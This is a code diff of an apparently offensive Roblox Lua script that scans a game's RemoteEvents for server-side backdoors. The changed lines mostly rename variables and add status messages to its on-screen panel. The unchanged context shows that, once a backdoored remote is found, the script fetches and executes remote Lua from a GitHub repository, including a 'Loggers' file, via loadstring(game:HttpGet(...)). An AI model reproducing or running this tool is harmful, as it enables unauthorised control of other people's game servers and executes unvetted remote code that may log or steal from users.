@@ -21,12 +21,12 @@ Abuses Delete Remotes
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ]]--
 
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
+local players = game:GetService("Players")
+local tweenservice = game:GetService("TweenService")
+local userinputservice = game:GetService("UserInputService")
+local runservice = game:GetService("RunService")
 
-local localplayer = Players.LocalPlayer
+local localplayer = players.LocalPlayer
 local playergui = localplayer:WaitForChild("PlayerGui")
 
 local timer = 0 -- lil stopwatch fr
@@ -52,20 +52,20 @@ mainframe.BorderSizePixel = 0
 mainframe.Parent = screengui
 
 local dragging
-local dragStart
-local startPos
+local dragstart
+local startpos
 
-local function updateInput(input)
-    local delta = input.Position - dragStart
-    local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+local function updateinput(input)
+    local delta = input.Position - dragstart
+    local position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
     mainframe.Position = position
 end
 
 mainframe.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         dragging = true
-        dragStart = input.Position
-        startPos = mainframe.Position
+        dragstart = input.Position
+        startpos = mainframe.Position
         
         input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
@@ -78,7 +78,7 @@ end)
 mainframe.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
         if dragging then
-            updateInput(input)
+            updateinput(input)
         end
     end
 end)
@@ -192,6 +192,7 @@ detailslabel.Name = "DetailsLabel"
 detailslabel.Size = UDim2.new(1, -40, 0, 60)
 detailslabel.Position = UDim2.new(0, 20, 0, 160)
 detailslabel.BackgroundTransparency = 1
+detailslabel.Text = "Elapsed time: 0s | Status: Initializing..."
 detailslabel.TextColor3 = Color3.fromRGB(180, 180, 180)
 detailslabel.TextScaled = true
 detailslabel.Font = Enum.Font.Gotham
@@ -207,6 +208,18 @@ loadingdots.TextColor3 = Color3.fromRGB(100, 255, 150)
 loadingdots.TextScaled = true
 loadingdots.Font = Enum.Font.GothamBold
 loadingdots.Parent = mainframe
+
+coroutine.wrap(function()
+    while mainframe.Parent and not backdoorfound do
+        local elapsedtime = math.floor(timer)
+        if scannedremotes == 0 then
+            detailslabel.Text = "Elapsed time: "..elapsedtime.."s | Status: Preparing..."
+        else
+            detailslabel.Text = "Elapsed time: "..elapsedtime.."s | Status: Ready to scan"
+        end
+        task.wait(0.1)
+    end
+end)()
 
 coroutine.wrap(function()
     while mainframe.Parent do
@@ -231,7 +244,7 @@ end)()
 mainframe.Size = UDim2.new(0, 0, 0, 0)
 mainframe.BackgroundTransparency = 1
 
-local entrancetween = TweenService:Create(mainframe, 
+local entrancetween = tweenservice:Create(mainframe, 
     TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
     {Size = UDim2.new(0, 450, 0, 280), BackgroundTransparency = 0.15}
 )
@@ -280,6 +293,8 @@ local function scan()
     if backdoorfound then return end
     
     statuslabel.Text = "Counting remotes..."
+    detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | Status: Counting remotes..."
+    
     for i, v in ipairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") then
             if v.Parent and v.Parent.Name ~= "RobloxReplicatedStorage" then
@@ -289,6 +304,7 @@ local function scan()
     end
     
     statuslabel.Text = "Found "..totalremotes.." remotes to scan"
+    detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | Status: Found "..totalremotes.." remotes"
     task.wait(1)
     
     for i, v in ipairs(game:GetDescendants()) do
@@ -300,20 +316,32 @@ local function scan()
             local progress = scannedremotes / totalremotes
             
             statuslabel.Text = "Scanning: "..v.Name.." ("..scannedremotes.."/"..totalremotes..")"
+            detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | Testing: "..v.Name
             
-            local progresstween = TweenService:Create(progressbar,
+            local progresstween = tweenservice:Create(progressbar,
                 TweenInfo.new(0.3, Enum.EasingStyle.Quad),
                 {Size = UDim2.new(progress, 0, 1, 0)}
             )
             progresstween:Play()
             
-            if remotebackdoored(v) == true then
+            local isbackdoored = remotebackdoored(v)
+            
+            -- Update details with result
+            if isbackdoored then
+                detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | "..v.Name..": BACKDOORED! 🎯"
+                detailslabel.TextColor3 = Color3.fromRGB(255, 100, 100)
                 backdoorfound = true
                 print("found1!!?!?!")
                 return
+            else
+                detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | "..v.Name..": Safe ✓"
+                task.wait(0.1) -- Brief pause to show the result
             end
         end
     end
+    
+    -- If we get here, no backdoor was found
+    detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | Scan complete - No backdoors found"
 end
 
 local function showresult()
@@ -324,6 +352,7 @@ local function showresult()
         statuslabel.TextColor3 = Color3.fromRGB(100, 255, 150)
         
         subtitlelabel.Text = "Backdoored Remote: "..vulnremote.Name
+        detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | Remote: "..vulnremote.Name.." is EXPLOITABLE!"
         
         loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v.5.50.lua"))()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Loggers/log_v5.50.lua"))()
@@ -332,11 +361,14 @@ local function showresult()
         statuslabel.Text = "❌ No backdoor found"
         statuslabel.TextColor3 = Color3.fromRGB(255, 100, 100)
         subtitlelabel.Text = "This game appears to be secure"
+        detailslabel.Text = "Elapsed time: "..math.floor(timer).."s | All "..totalremotes.." remotes are secure"
         
         mainframe.BackgroundColor3 = Color3.fromRGB(50, 15, 15)
     end
     
-    local exittween = TweenService:Create(mainframe,
+    task.wait(3) -- show da result for 3 seconds
+    
+    local exittween = tweenservice:Create(mainframe,
         TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In),
         {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}
     )
